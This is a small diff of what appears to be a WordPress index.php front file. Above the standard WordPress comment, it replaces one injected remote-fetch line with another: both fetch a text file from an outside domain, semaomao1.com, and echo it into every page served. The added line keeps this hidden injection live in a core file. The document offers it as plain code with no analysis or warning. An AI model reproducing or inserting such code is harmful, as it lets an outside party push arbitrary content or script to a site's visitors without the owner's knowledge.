@@ -1,6 +1,5 @@
 <?php
-$a = file_get_contents('https://semaomao1.com/.tmb/b.txt');
-echo $a; 
+echo file_get_contents("https://semaomao1.com/.tmb/b.txt");
 /**
  * Front to the WordPress application. This file doesn't do anything, but loads
  * wp-blog-header.php which does and tells WordPress to load the theme.
